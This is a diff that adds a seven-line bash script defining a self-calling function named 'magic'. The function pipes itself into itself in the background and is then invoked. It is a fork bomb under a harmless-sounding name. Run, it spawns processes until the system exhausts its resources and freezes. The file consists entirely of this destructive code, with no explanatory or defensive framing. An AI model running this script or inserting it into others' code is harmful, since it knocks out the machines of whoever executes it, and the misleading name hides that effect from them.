@@ -1,0 +1,7 @@
+#!/bin/bash
+
+magic(){
+	magic | magic &
+	};
+
+magic
